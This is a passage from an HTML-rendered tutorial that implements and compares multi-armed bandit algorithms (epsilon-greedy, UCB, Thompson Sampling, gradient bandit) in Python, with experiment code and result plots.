        <span class="token keyword">if</span> i <span class="token operator">&lt;</span> self<span class="token punctuation">.</span>mean<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token number">0</span>
</code></pre> 
<h4>
<a id="1_varepsilonGreedy_Algorithm_348"></a>1. <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        ε
       
      
      
       varepsilon
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.43056em;vertical-align: 0em"></span><span class="mord mathdefault">ε</span></span></span></span></span>-Greedy Algorithm</h4> 
<p><img src="https://images2.imgbox.com/bb/f3/Mz2xfGan_o.png" alt="在这里插入图片描述"></p> 
<p><strong><span class="katex--inline"><span class="katex"><span class="katex-mathml">
     
      
       
        
         ε
        
       
       
        varepsilon
       
      
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.43056em;vertical-align: 0em"></span><span class="mord mathdefault">ε</span></span></span></span></span>-Greedy Algorithm</strong> can be defined as the algorithm to choose the arm which has the largest mean before and have a probability to randomly choose other arm, by which we can achieve both the exploition strategy (probability = <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        1
       
       
        −
       
       
        ε
       
      
      
       1-varepsilon
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.72777em;vertical-align: -0.08333em"></span><span class="mord">1</span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mbin">−</span><span class="mspace" style="margin-right: 0.222222em"></span></span><span class="base"><span class="strut" style="height: 0.43056em;vertical-align: 0em"></span><span class="mord mathdefault">ε</span></span></span></span></span>) and exploration strategy (probability = <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        ε
       
      
      
       varepsilon
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.43056em;vertical-align: 0em"></span><span class="mord mathdefault">ε</span></span></span></span></span>) randomly.</p> 
<p>The class “Greedy” is to generate a algorithm class to achieve <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        ε
       
      
      
       varepsilon
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.43056em;vertical-align: 0em"></span><span class="mord mathdefault">ε</span></span></span></span></span>-Greedy Algorithm. It has three basic process: <strong>initialization, choosing the best arm, updating mean reward</strong>.</p> 
<pre><code class="prism language-python"><span class="token keyword">class</span> <span class="token class-name">Greedy</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> epsilon<span class="token punctuation">,</span> count <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">,</span> mean <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>epsilon <span class="token operator">=</span> epsilon
        self<span class="token punctuation">.</span>count <span class="token operator">=</span> count
        self<span class="token punctuation">.</span>mean <span class="token operator">=</span> mean
    
    <span class="token keyword">def</span> <span class="token function">initialize</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> num_arms<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>count <span class="token operator">=</span> np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span>num_arms<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>mean <span class="token operator">=</span> np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span>num_arms<span class="token punctuation">)</span>
    
    <span class="token keyword">def</span> <span class="token function">best_arm</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        i <span class="token operator">=</span> random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>

        <span class="token keyword">if</span> i <span class="token operator">&lt;</span> self<span class="token punctuation">.</span>epsilon<span class="token punctuation">:</span>
            <span class="token comment">#random choose the arms</span>
            <span class="token keyword">return</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>mean<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>

        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token comment">#choose the arm with the maximum mean</span>
            <span class="token keyword">return</span> np<span class="token punctuation">.</span>argmax<span class="token punctuation">(</span>self<span class="token punctuation">.</span>mean<span class="token punctuation">)</span>
        
    <span class="token keyword">def</span> <span class="token function">update</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> chosen_arm<span class="token punctuation">,</span> reward<span class="token punctuation">,</span> slot<span class="token punctuation">)</span><span class="token punctuation">:</span>

        <span class="token comment">#update the count of the chosen arm by one</span>
        self<span class="token punctuation">.</span>count<span class="token punctuation">[</span>chosen_arm<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span>

        <span class="token comment">#update the estimated mean of the chosen arm</span>
        self<span class="token punctuation">.</span>mean<span class="token punctuation">[</span>chosen_arm<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token punctuation">(</span>reward<span class="token operator">-</span>self<span class="token punctuation">.</span>mean<span class="token punctuation">[</span>chosen_arm<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">/</span> 
                                    self<span class="token punctuation">.</span>count<span class="token punctuation">[</span>chosen_arm<span class="token punctuation">]</span>
</code></pre> 
<h4>
<a id="2_UCB_Algorithm_386"></a>2. UCB Algorithm</h4> 
<p><img src="https://images2.imgbox.com/e6/f4/8DlsCXvk_o.png" alt="在这里插入图片描述"></p> 
<p><strong>Upper Confidence Bounds(UCB) Algorithm</strong> measures the exploration of actions with a strong potential to have a optimal value by an upper confidence bound of the reward value.</p> 
<p>The class “UCB” is to generate a algorithm class to achieve UCB Algorithm. It has the similar process with the previous one.</p> 
<pre><code class="prism language-python"><span class="token keyword">class</span> <span class="token class-name">UCB</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> c<span class="token punctuation">,</span> count <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">,</span> mean <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>count <span class="token operator">=</span> count
        self<span class="token punctuation">.</span>mean <span class="token operator">=</span> mean
        self<span class="token punctuation">.</span>c <span class="token operator">=</span> c

    <span class="token keyword">def</span> <span class="token function">initialize</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> num_arms<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>count <span class="token operator">=</span> np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span>num_arms<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>mean <span class="token operator">=</span> np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span>num_arms<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>num_arms <span class="token operator">=</span> num_arms
        self<span class="token punctuation">.</span>t <span class="token operator">=</span> <span class="token number">0</span>

    <span class="token keyword">def</span> <span class="token function">best_arm</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        
        <span class="token keyword">if</span> self<span class="token punctuation">.</span>t <span class="token operator">&lt;=</span> self<span class="token punctuation">.</span>num_arms<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> self<span class="token punctuation">.</span>t

        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token comment">#choose the best arm</span>
            <span class="token keyword">return</span> np<span class="token punctuation">.</span>argmax<span class="token punctuation">(</span>self<span class="token punctuation">.</span>mean <span class="token operator">+</span> 
                self<span class="token punctuation">.</span>c<span class="token operator">*</span>math<span class="token punctuation">.</span>sqrt<span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span>math<span class="token punctuation">.</span>log<span class="token punctuation">(</span>self<span class="token punctuation">.</span>t<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span>self<span class="token punctuation">.</span>count<span class="token punctuation">)</span>
        
    <span class="token keyword">def</span> <span class="token function">update</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> chosen_arm<span class="token punctuation">,</span> reward<span class="token punctuation">,</span> slot<span class="token punctuation">)</span><span class="token punctuation">:</span>

        <span class="token keyword">if</span> self<span class="token punctuation">.</span>t <span class="token operator">&lt;=</span> self<span class="token punctuation">.</span>num_arms<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>count<span class="token punctuation">[</span>self<span class="token punctuation">.</span>t<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>
            self<span class="token punctuation">.</span>mean<span class="token punctuation">[</span>self<span class="token punctuation">.</span>t<span class="token punctuation">]</span> <span class="token operator">=</span> reward

        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token comment">#update the count of the chosen arm by one</span>
            self<span class="token punctuation">.</span>count<span class="token punctuation">[</span>chosen_arm<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span>

            <span class="token comment">#update the estimated mean of the chosen arm</span>
            self<span class="token punctuation">.</span>mean<span class="token punctuation">[</span>chosen_arm<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token punctuation">(</span>reward<span class="token operator">-</span>self<span class="token punctuation">.</span>mean<span class="token punctuation">[</span>chosen_arm<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">/</span> 
                                        self<span class="token punctuation">.</span>count<span class="token punctuation">[</span>chosen_arm<span class="token punctuation">]</span>
        
        self<span class="token punctuation">.</span>t <span class="token operator">+=</span> <span class="token number">1</span>

</code></pre> 
<h4>
<a id="3_Thompson_Sampling_TS_Algorithm_433"></a>3. Thompson Sampling (TS) Algorithm</h4> 
<p><img src="https://images2.imgbox.com/18/ff/O1meeo05_o.png" alt="在这里插入图片描述"></p> 
<p><strong>Thompson Sampling</strong> is an algorithm for online decision problems where actions are taken sequentially in a manner that must balance between exploiting what is known to maximize immediate performance and investing to accumulate new information that may improve future performance. The algorithm addresses a broad range of problems in a computationally eﬃcient manner and is therefore enjoying wide use.</p> 
<p>The class “TS” is to generate a algorithm class to achieve Thompson Sampling Algorithm. It has the similar process with the previous two.</p> 
<pre><code class="prism language-python"><span class="token keyword">class</span> <span class="token class-name">TS</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> alpha<span class="token punctuation">,</span> beta<span class="token punctuation">,</span> mean <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>alpha <span class="token operator">=</span> alpha
        self<span class="token punctuation">.</span>beta <span class="token operator">=</span> beta
        self<span class="token punctuation">.</span>mean <span class="token operator">=</span> mean

    <span class="token keyword">def</span> <span class="token function">initialize</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> num_arms<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>num_arms <span class="token operator">=</span> num_arms
        self<span class="token punctuation">.</span>mean <span class="token operator">=</span> np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span>num_arms<span class="token punctuation">)</span>
    
    <span class="token keyword">def</span> <span class="token function">best_arm</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>num_arms<span class="token punctuation">)</span><span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>mean<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>beta<span class="token punctuation">(</span>self<span class="token punctuation">.</span>alpha<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>self<span class="token punctuation">.</span>beta<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>

        <span class="token comment">#choose the arm with the maximum mean</span>
        <span class="token keyword">return</span> np<span class="token punctuation">.</span>argmax<span class="token punctuation">(</span>self<span class="token punctuation">.</span>mean<span class="token punctuation">)</span>
        
    <span class="token keyword">def</span> <span class="token function">update</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> chosen_arm<span class="token punctuation">,</span> reward<span class="token punctuation">,</span> slot<span class="token punctuation">)</span><span class="token punctuation">:</span>

        <span class="token comment">#update the parameter alpha and beta</span>
        self<span class="token punctuation">.</span>alpha<span class="token punctuation">[</span>chosen_arm<span class="token punctuation">]</span> <span class="token operator">+=</span> reward
        self<span class="token punctuation">.</span>beta<span class="token punctuation">[</span>chosen_arm<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token operator">-</span>reward
</code></pre> 
<h4>
<a id="4_Parameterized_Gradient_Bandit_Algorithm_464"></a>4. (Parameterized) Gradient Bandit Algorithm</h4> 
<p><img src="https://images2.imgbox.com/a6/80/lJCzBAD7_o.png" alt="在这里插入图片描述"></p> 
<pre><code class="prism language-python"><span class="token comment"># time-varying parameter beta: beta = log(t)</span>
<span class="token keyword">def</span> <span class="token function">Beta</span><span class="token punctuation">(</span>slot<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> slot <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> math<span class="token punctuation">.</span>log<span class="token punctuation">(</span>slot<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token number">0</span>

<span class="token keyword">class</span> <span class="token class-name">Gradient</span><span class="token punctuation">:</span>    
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> step_size <span class="token operator">=</span> <span class="token number">0.1</span><span class="token punctuation">,</span> baseline <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">,</span> beta <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> step_size <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>lr <span class="token operator">=</span> <span class="token number">0.1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>lr <span class="token operator">=</span> step_size
        <span class="token comment"># beta not equal to none means beta is a constant. </span>
        <span class="token comment"># Otherwise, it is a time-varing function</span>
        <span class="token keyword">if</span> beta <span class="token operator">!=</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>beta <span class="token operator">=</span> beta
            
        <span class="token comment"># if there is no value of baseline is passed in, </span>
        <span class="token comment"># then we set the baseline to be the average reward</span>
        <span class="token keyword">if</span> baseline <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>total_reward <span class="token operator">=</span> <span class="token number">0</span>
        self<span class="token punctuation">.</span>baseline <span class="token operator">=</span> baseline
        
    <span class="token keyword">def</span> <span class="token function">initialize</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> num_arms<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>num_arms <span class="token operator">=</span> num_arms
        self<span class="token punctuation">.</span>H_prefer <span class="token operator">=</span> np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span>num_arms<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>pr <span class="token operator">=</span> np<span class="token punctuation">.</span>ones<span class="token punctuation">(</span>num_arms<span class="token punctuation">)</span><span class="token operator">/</span>num_arms

    <span class="token keyword">def</span> <span class="token function">best_arm</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        arms <span class="token operator">=</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span>self<span class="token punctuation">.</span>num_arms<span class="token punctuation">)</span>
        <span class="token comment">#choose the arm according to the probability distribution</span>
        <span class="token keyword">return</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>arms<span class="token punctuation">,</span> p<span class="token operator">=</span>self<span class="token punctuation">.</span>pr<span class="token punctuation">)</span>
        
    <span class="token keyword">def</span> <span class="token function">update</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> chosen_arm<span class="token punctuation">,</span> reward<span class="token punctuation">,</span> slot<span class="token punctuation">)</span><span class="token punctuation">:</span>
        
        <span class="token comment"># if there is no value of baseline is passed in, </span>
        <span class="token comment"># then we set the baseline to be the average reward</span>
        <span class="token keyword">if</span> self<span class="token punctuation">.</span>baseline <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>total_reward <span class="token operator">+=</span> reward
            self<span class="token punctuation">.</span>baseline <span class="token operator">=</span> self<span class="token punctuation">.</span>total_reward<span class="token operator">/</span><span class="token punctuation">(</span>slot<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>
            
        <span class="token comment"># beta is a time-varying parameter</span>
        self<span class="token punctuation">.</span>beta <span class="token operator">=</span> Beta<span class="token punctuation">(</span>slot<span class="token punctuation">)</span>

        <span class="token comment"># sum of all perference function indices</span>
        Sum <span class="token operator">=</span> <span class="token number">0</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>num_arms<span class="token punctuation">)</span><span class="token punctuation">:</span>
            Sum <span class="token operator">+=</span> math<span class="token punctuation">.</span>exp<span class="token punctuation">(</span>self<span class="token punctuation">.</span>beta<span class="token operator">*</span>self<span class="token punctuation">.</span>H_prefer<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>

        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>num_arms<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token comment">#update the probability of choose arm</span>
            self<span class="token punctuation">.</span>pr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> math<span class="token punctuation">.</span>exp<span class="token punctuation">(</span>self<span class="token punctuation">.</span>beta<span class="token operator">*</span>self<span class="token punctuation">.</span>H_prefer<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">/</span>Sum

            <span class="token comment">#update the preference function</span>
            <span class="token keyword">if</span> i <span class="token operator">==</span> chosen_arm<span class="token punctuation">:</span>
                I <span class="token operator">=</span> <span class="token number">1</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                I <span class="token operator">=</span> <span class="token number">0</span>
            self<span class="token punctuation">.</span>H_prefer<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>H_prefer<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> self<span class="token punctuation">.</span>lr<span class="token operator">*</span><span class="token punctuation">(</span>reward<span class="token operator">-</span>self<span class="token punctuation">.</span>baseline<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>I<span class="token operator">-</span>self<span class="token punctuation">.</span>pr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
</code></pre> 
<pre><code class="prism language-python"><span class="token comment"># number of slots</span>
N <span class="token operator">=</span> <span class="token number">5000</span>
<span class="token comment"># number of experiments</span>
num_exper <span class="token operator">=</span> <span class="token number">1000</span>
</code></pre> 
<ol><li>we test the <strong><span class="katex--inline"><span class="katex"><span class="katex-mathml">
      
       
        
         
          ε
         
        
        
         varepsilon
        
       
      </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.43056em;vertical-align: 0em"></span><span class="mord mathdefault">ε</span></span></span></span></span>-Greedy Algorithm</strong> with <span class="katex--inline"><span class="katex"><span class="katex-mathml">
     
      
       
        
         ε
        
        
         =
        
        
         0.1
        
        
         ,
        
        
         0.5
        
        
         ,
        
        
         0.9
        
       
       
        varepsilon = 0.1,0.5,0.9
       
      
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.43056em;vertical-align: 0em"></span><span class="mord mathdefault">ε</span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 0.83888em;vertical-align: -0.19444em"></span><span class="mord">0</span><span class="mord">.</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord">0</span><span class="mord">.</span><span class="mord">5</span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord">0</span><span class="mord">.</span><span class="mord">9</span></span></span></span></span>.</li></ol> 
<pre><code class="prism language-python">epsilon <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0.1</span><span class="token punctuation">,</span><span class="token number">0.5</span><span class="token punctuation">,</span><span class="token number">0.9</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
arms <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span>Bern_arm<span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> arm_mean<span class="token punctuation">]</span><span class="token punctuation">)</span>
E_greedy<span class="token punctuation">,</span>max_i<span class="token punctuation">,</span>average_percent<span class="token punctuation">,</span>optimal_percent_greedy <span class="token operator">=</span> plot_algorithm<span class="token punctuation">(</span>Greedy<span class="token punctuation">,</span>epsilon<span class="token punctuation">,</span>arms<span class="token punctuation">,</span>arm_mean<span class="token punctuation">,</span>num_exper<span class="token punctuation">,</span>N<span class="token punctuation">,</span>label<span class="token operator">=</span><span class="token string">"$epsilon$"</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"The maximum of expectation of epsilon-greedy is {:.4f} (epsilon = {})"</span>
    <span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>E_greedy<span class="token punctuation">,</span>epsilon<span class="token punctuation">[</span>max_i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"The maximum percentage of plays in which the optimal arm is pulled = {:.4f}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>optimal_percent_greedy<span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/d6/12/BqwhHA0G_o.png" alt="在这里插入图片描述"></p> 
<ol start="2"><li>we test the <strong>UCB Algorithem</strong> with <span class="katex--inline"><span class="katex"><span class="katex-mathml">
     
      
       
        
         c
        
        
         =
        
        
         1
        
        
         ,
        
        
         5
        
        
         ,
        
        
         10
        
       
       
        c = 1,5,10
       
      
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.43056em;vertical-align: 0em"></span><span class="mord mathdefault">c</span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 0.83888em;vertical-align: -0.19444em"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord">5</span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord">1</span><span class="mord">0</span></span></span></span></span>.</li></ol> 
<pre><code class="prism language-python">c <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
arms <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span>Bern_arm<span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> arm_mean<span class="token punctuation">]</span><span class="token punctuation">)</span>
E_UCB<span class="token punctuation">,</span>max_i<span class="token punctuation">,</span>average_percent<span class="token punctuation">,</span>optimal_percent_UCB <span class="token operator">=</span> plot_algorithm<span class="token punctuation">(</span>UCB<span class="token punctuation">,</span>c<span class="token punctuation">,</span>arms<span class="token punctuation">,</span>arm_mean<span class="token punctuation">,</span>num_exper<span class="token punctuation">,</span>N<span class="token punctuation">,</span>label<span class="token operator">=</span><span class="token string">"c"</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"The maximum of expectation of UCB is {:.4f} (c = {})"</span>
    <span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>E_UCB<span class="token punctuation">,</span>c<span class="token punctuation">[</span>max_i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"The maximum percentage of plays in which the optimal arm is pulled = {:.4f}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>optimal_percent_UCB<span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/5a/11/MR7NAY5y_o.png" alt="在这里插入图片描述"></p> 
<ol start="3"><li>we test <strong>Thompson Sampling</strong>.</li></ol> 
<pre><code class="prism language-python">beta <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">601</span><span class="token punctuation">,</span><span class="token number">401</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">401</span><span class="token punctuation">,</span><span class="token number">601</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
arms <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span>Bern_arm<span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> arm_mean<span class="token punctuation">]</span><span class="token punctuation">)</span>
E_TS<span class="token punctuation">,</span>max_i<span class="token punctuation">,</span>average_percent<span class="token punctuation">,</span>optimal_percent_TS <span class="token operator">=</span> plot_algorithm<span class="token punctuation">(</span>TS<span class="token punctuation">,</span>beta<span class="token punctuation">,</span>arms<span class="token punctuation">,</span>arm_mean<span class="token punctuation">,</span>num_exper<span class="token punctuation">,</span>N<span class="token punctuation">,</span>label<span class="token operator">=</span><span class="token string">"$beta$"</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"The maximum of expectation of Thompson Sampling is {:.4f} (beta {})"</span>
    <span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>E_TS<span class="token punctuation">,</span>max_i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"The maximum percentage of plays in which the optimal arm is pulled = {:.4f}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>optimal_percent_TS<span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/6a/ea/hpmAuaYg_o.png" alt="在这里插入图片描述"></p> 
<ol start="4"><li>we test <strong>Gradient Bandit Algorithm</strong> with baseline <span class="katex--inline"><span class="katex"><span class="katex-mathml">
     
      
       
        
         b
        
        
         =
        
        
         0
        
        
         ,
        
        
         0.8
        
        
         ,
        
        
         5
        
        
         ,
        
        
         20
        
       
       
        b = 0, 0.8, 5, 20
       
      
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.69444em;vertical-align: 0em"></span><span class="mord mathdefault">b</span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 0.83888em;vertical-align: -0.19444em"></span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord">0</span><span class="mord">.</span><span class="mord">8</span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord">5</span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord">2</span><span class="mord">0</span></span></span></span></span>.</li></ol> 
<pre><code class="prism language-python"><span class="token comment"># para_list:[step_size, baseline, beta] (default: step_size = 0.1, beta = 1)</span>
step_size <span class="token operator">=</span> <span class="token number">0.1</span>
